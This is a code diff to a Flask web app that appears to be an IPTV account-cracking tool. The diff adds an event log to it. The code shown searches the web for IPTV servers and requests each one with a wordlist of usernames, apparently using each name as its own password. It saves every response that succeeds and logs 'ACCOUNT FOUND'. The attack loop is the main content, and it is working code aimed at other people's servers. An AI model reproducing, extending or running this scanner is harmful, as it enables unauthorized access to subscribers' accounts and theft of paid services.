@@ -16,8 +16,14 @@ scan_state = {
     "total": 0,
     "current_url": "",
     "status_message": "Idle",
-    "found_accounts": 0
+    "found_accounts": 0,
+    "logs": []
 }
+
+def log_event(message):
+    scan_state["logs"].append(message)
+    if len(scan_state["logs"]) > 200:
+        scan_state["logs"].pop(0)
 
 @app.route("/")
 def index():
@@ -37,6 +43,7 @@ def add_url():
     data = request.json or {}
     url = data.get("url", "").strip()
     if crawler.add_custom_url(url):
+        log_event(f"Manually added target server: {url}")
         return jsonify({"success": True, "message": f"Added {url}", "parsed_urls": crawler.parsedUrls})
     return jsonify({"success": False, "message": "Invalid or duplicate URL"}), 400
 
@@ -46,9 +53,13 @@ def search_links():
     query = data.get("query", "").strip() or None
 
     def do_search():
-        scan_state["status_message"] = "Searching web for IPTV server URLs..."
+        msg = "Searching web for IPTV server URLs..."
+        scan_state["status_message"] = msg
+        log_event(msg)
         found = crawler.search_links(query)
-        scan_state["status_message"] = f"Search complete. Total servers available: {len(crawler.parsedUrls)}"
+        msg_complete = f"Search complete. Discovered {found} new servers. Total available: {len(crawler.parsedUrls)}"
+        scan_state["status_message"] = msg_complete
+        log_event(msg_complete)
 
     thread = threading.Thread(target=do_search)
     thread.start()
@@ -60,6 +71,7 @@ def change_language():
     lang = data.get("language", "it")
     success = crawler.change_language(lang)
     if success:
+        log_event(f"Language changed to {lang}.txt")
         return jsonify({"success": True, "language": crawler.language, "message": f"Language set to {lang}"})
     else:
         return jsonify({"success": False, "message": f"Language file for {lang} not found"}), 400
@@ -80,16 +92,21 @@ def start_scan():
         target_url = url if url else (random.choice(crawler.parsedUrls) if crawler.parsedUrls else None)
         if not target_url:
             scan_state["is_scanning"] = False
-            scan_state["status_message"] = "No server URLs available. Run search or add a server URL."
+            msg = "No server URLs available. Run search or add a server URL."
+            scan_state["status_message"] = msg
+            log_event(msg)
             return
 
         scan_state["current_url"] = target_url
+        msg_start = f"Attack URL: {target_url}"
         scan_state["status_message"] = f"Scanning {target_url}..."
+        log_event(msg_start)
 
         lang_file = os.path.join(crawler.languageDir, crawler.language + ".txt")
         if not os.path.exists(lang_file):
             scan_state["is_scanning"] = False
             scan_state["status_message"] = "Language file missing."
+            log_event("Error: Language file missing.")
             return
 
         with open(lang_file, "r", encoding="utf-8", errors="ignore") as f:
@@ -102,6 +119,7 @@ def start_scan():
         import requests
         for idx, username in enumerate(lines, start=1):
             scan_state["progress"] = idx
+            log_event(f"request for name: {username}")
             target = target_url + crawler.basicString % (username, username)
             try:
                 res = requests.get(target, headers=headers, timeout=4)
@@ -111,6 +129,7 @@ def start_scan():
                     crawler.create_file(username, new_path, res.text)
                     found += 1
                     scan_state["found_accounts"] = found
+                    log_event(f"ACCOUNT FOUND !!! [username: {username}]")
             except Exception:
                 pass
 
@@ -118,7 +137,9 @@ def start_scan():
             crawler.parsedUrls.remove(target_url)
 
         scan_state["is_scanning"] = False
-        scan_state["status_message"] = f"Scan complete for {target_url}. Found {found} accounts."
+        msg_done = f"Scan complete for {target_url}. Total accounts found: {found}"
+        scan_state["status_message"] = msg_done
+        log_event(msg_done)
 
     thread = threading.Thread(target=run_scan)
     thread.start()
